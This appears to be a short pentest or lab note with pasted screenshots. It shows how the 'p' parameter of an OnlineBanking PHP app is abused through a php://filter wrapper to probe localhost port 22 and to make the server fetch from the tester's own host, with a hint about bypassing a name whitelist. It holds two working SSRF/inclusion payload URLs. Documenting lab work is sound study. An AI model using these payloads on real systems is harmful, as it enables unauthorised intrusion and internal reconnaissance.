
Veryfication if we see any header or fingerprint of a service
http://172.16.1.140/OnlineBanking/index.php?p=php://filter/convert.base64-encode/resource=http://localhost:22

Verifying if we receive a connection to a local web server.

http://172.16.1.140/OnlineBanking/index.php?p=php://filter/convert.base64-encode/resource=http://172.16.1.128/test

![[Pasted image 20240328163718.png]]

If there is an internal white list by using names, we can try changing the resource to be gotten from our server:

![[Pasted image 20240328163908.png]]
![[Pasted image 20240328163858.png]]
